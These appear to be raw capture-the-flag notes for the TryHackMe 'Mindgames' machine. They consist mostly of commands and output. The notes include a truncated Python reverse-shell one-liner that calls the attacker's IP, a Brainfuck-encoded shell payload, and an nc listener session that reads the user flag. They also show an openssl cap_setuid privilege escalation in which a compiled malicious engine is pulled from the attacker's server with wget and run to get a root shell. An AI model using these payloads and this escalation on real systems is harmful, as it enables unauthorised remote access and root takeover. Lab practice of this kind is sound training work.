python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.76.89",1234));




encoded shell
==============

port 1234
```
+[----->+++<]>++.++++.+++.-.+++.++.[---->+<]>+++.---[->++++<]>-.----.------------.++++++++.------.[--->+<]>---.[++>---<]>--.-[--->++<]>+.++.+[->+++<]>.++++++++++++++.++.---.------------.++.[--->+<]>----..-[++>---<]>+.-[----->+<]>.++++.+[-->+<]>+.-[->++<]>-.+[-->+<]>+++.---[->++<]>-.----.------------.++++++++.------.[--->+<]>---.[++>---<]>.[--->++<]>-.----.------------.++++++++.------.[--->+<]>---.+[--->+<]>+.--[->+++<]>+.----.------------.++++++++.------.[--->+<]>---.[++>---<]>.--[-->+++<]>-.+++++.[->+++++<]>+.[--->+++++<]>.+++++.---------.>-[--->+<]>-.[-->+<]>++.-[--->++<]>+.----.------------.++++++++.------.[--->+<]>---.[++>---<]>.>-[--->+<]>--.----.[----->+<]>.++++++++.--[----->+++<]>.------------.+.--.-[->++++<]>+.----.++++++++++++.+[-->+<]>++.-[-->+++<]>-.-[->++<]>-.+[++>---<]>.--[--->+<]>-.++++++++++++.-..---------.--.-[--->+<]>--.+[--->+<]>+..------.[-->+++<]>--.-.--.+++.+++++++.----------.+++++++++.-.--------.++++++++++.+.+[->+++++<]>.++++++++++.+++++.+.+.+.-----------..-[-->+++<]>-.---[->++<]>-.++++.+[++>---<]>.--[--->+<]>.--[--->+<]>-.-----.[->+++++<]>++.----------.--[->+++<]>+.+[++>---<]>.+[--->+<]>+.+++.+++.-------.+++++++++.+.+[++>---<]>.+.+++.++++.-------.-[-->+++<]>-.+[-->+<]>++.+++++[->+++<]>.++++.+[++>---<]>.--[--->+<]>.--[--->+<]>-.-----.[->+++++<]>++.----------.--[->+++<]>+.+[++>---<]>.+[--->+<]>+.+++.+++.-------.+++++++++.+.+[++>---<]>.+.+++.+++++.--------.-[-->+++<]>-.---[->++<]>-.++++.+[++>---<]>.--[--->+<]>.--[--->+<]>-.-----.[->+++++<]>++.----------.--[->+++<]>+.+[++>---<]>.+[--->+<]>+.+++.+++.-------.+++++++++.+.+[++>---<]>.+.+++.++++++.---------.-[-->+++<]>-.[--->+<]>.++++.+++.-.+++.++.[---->+<]>+++.[-->+++++++<]>.++++.+++++.-[-->+<]>-.+[-->+<]>++.[-->+++++++<]>.++++.+++++.-----[++>---<]>.[--->++<]>-.---.[----->++<]>+.+[--->+<]>+.---------.++[++>---<]>.------.+++++++++++++.++[->++<]>.+++++++.+++++.++[->+++++<]>-.-[--->++<]>-.-----------.--[--->+<]>.+++++++.

```
user flag
=========

```

└─$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.18.76.89] from (UNKNOWN) [10.10.174.200] 47212
$ id
id
uid=1001(mindgames) gid=1001(mindgames) groups=1001(mindgames)
$ cd /home
cd /home
$ ls
ls
mindgames  tryhackme
$ cd mindgames
cd mindgames
$ ls
ls
user.txt  webserver
$ cat user.txt
cat user.txt
thm{411f7d38247ff441ce4e134b459b6268}
$ 

```

PRIV ESC
========

```
python3 -c 'import pty; pty.spawn("/bin/sh")'



╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                                                                             
Current capabilities:                                                                                                                                                  
Current: =
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Shell capabilities:
0x0000000000000000=
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Files with capabilities (limited to 50):
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/openssl = cap_setuid+ep
/home/mindgames/webserver/server = cap_net_bind_service+ep
/home/mindgames/webserver/server = cap_net_bind_service+ep is writable











┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Mindgames]
└─$ nano openssl-exploit-engine.c                             
                                                                                                                                                                       
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Mindgames]
└─$ gcc -fPIC -o openssl-exploit-engine.o -c openssl-exploit-engine.c
openssl-exploit-engine.c: In function ‘bind’:
openssl-exploit-engine.c:5:3: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    5 |   setuid(0); setgid(0);
      |   ^~~~~~
openssl-exploit-engine.c:5:14: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    5 |   setuid(0); setgid(0);
      |              ^~~~~~
                                                                                                                                                                       
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Mindgames]
└─$ gcc -shared -o openssl-exploit-engine.so -lcrypto openssl-exploit-engine.o
                                                                                                                                                                       
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Mindgames]
└─$ ls
nmap.md  openssl-exploit-engine.c  openssl-exploit-engine.o  openssl-exploit-engine.so  Taskanswers.md
                                                                                                                                                                       
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Mindgames]
└─$ python3 -m http.server 9000
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
10.10.174.200 - - [25/Mar/2022 03:31:47] "GET /openssl-exploit-engine.so HTTP/1.1" 200 -
^[[A^[[A^[[A^[[A^[[A^[[A^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^C
Keyboard interrupt received, exiting.
                                                                                                                                                                       
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Mindgames]



```

ROOT
===
```

ystemd-private-96647af0f4664dbaaf6a85e0b5d4c40c-systemd-resolved.service-waDSk8
systemd-private-96647af0f4664dbaaf6a85e0b5d4c40c-systemd-timesyncd.service-ZbpTe2
tmux-1001
$ wget http://10.18.76.89:9000/openssl-exploit-engine.so
wget http://10.18.76.89:9000/openssl-exploit-engine.so
--2022-03-25 07:31:49--  http://10.18.76.89:9000/openssl-exploit-engine.so
Connecting to 10.18.76.89:9000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15696 (15K) [application/octet-stream]
Saving to: ‘openssl-exploit-engine.so’

openssl-exploit-eng 100%[===================>]  15.33K  92.8KB/s    in 0.2s    

2022-03-25 07:31:49 (92.8 KB/s) - ‘openssl-exploit-engine.so’ saved [15696/15696]

$ ls
ls
linpeas.sh
openssl-exploit-engine.so
systemd-private-96647af0f4664dbaaf6a85e0b5d4c40c-systemd-resolved.service-waDSk8
systemd-private-96647af0f4664dbaaf6a85e0b5d4c40c-systemd-timesyncd.service-ZbpTe2
tmux-1001
$ openssl req -engine ./openssl-exploit-engine.so
openssl req -engine ./openssl-exploit-engine.so
root@mindgames:/tmp# ls
ls
linpeas.sh
openssl-exploit-engine.so
systemd-private-96647af0f4664dbaaf6a85e0b5d4c40c-systemd-resolved.service-waDSk8
systemd-private-96647af0f4664dbaaf6a85e0b5d4c40c-systemd-timesyncd.service-ZbpTe2
tmux-1001
root@mindgames:/tmp# cd /root
cd /root
root@mindgames:/root# ls
ls
root.txt
root@mindgames:/root# cat root.txt
cat root.txt
thm{1974a617cc84c5b51411c283544ee254}
root@mindgames:/root# 




```

FOLOW PROCESS = https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/

FOR PRIV ESC